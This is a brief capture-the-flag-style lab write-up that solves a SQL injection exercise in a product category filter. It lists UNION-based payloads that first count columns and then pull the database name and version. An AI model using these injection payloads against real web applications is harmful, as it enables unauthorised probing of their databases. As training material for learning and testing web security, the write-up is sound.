# Lab-04 SQl Injection

## SQL Injection attack, querying the Database type and version on MySQL and Microsoft

### Problem

- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

### Solution

- Goto => product category

```SQL 
-- Step-1 Try these to find the Number of Column
'UNION SELECT NULL--+
"UNION SELECT NULL,NULL--+
-- Step-2 After that Use 
`'UNION SELECT database(),version()--+` 
```

- Lab Solved!!
